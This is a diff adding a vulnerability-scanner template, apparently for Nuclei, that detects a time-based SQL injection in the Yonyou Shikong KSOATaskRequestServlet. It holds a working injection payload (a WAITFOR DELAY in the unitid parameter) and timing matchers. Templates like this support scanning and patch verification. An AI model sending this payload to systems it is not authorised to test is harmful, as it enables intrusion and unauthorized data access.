@@ -1,0 +1,32 @@
+id: yonyou-shikong-sql-injection
+info:
+  name: "用友时空 KSOATaskRequestServlet SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Targeting the KSOATaskRequestServlet component in Yonyou Space system reveals a SQL injection vulnerability.
+      Attackers can exploit this by crafting malicious database queries through improperly validated input parameters.
+      Successful exploitation may lead to unauthorized data access, data manipulation, or system compromise.
+      
+      
+      Reference: 
+        - https://www.yonyou.com/security-advisories
+  tags: 用友时空
+http:
+- raw:
+  - |
+    GET /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)
+    Accept-Encoding: gzip, deflate
+    Connection: clos
+
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=7
+    condition: and
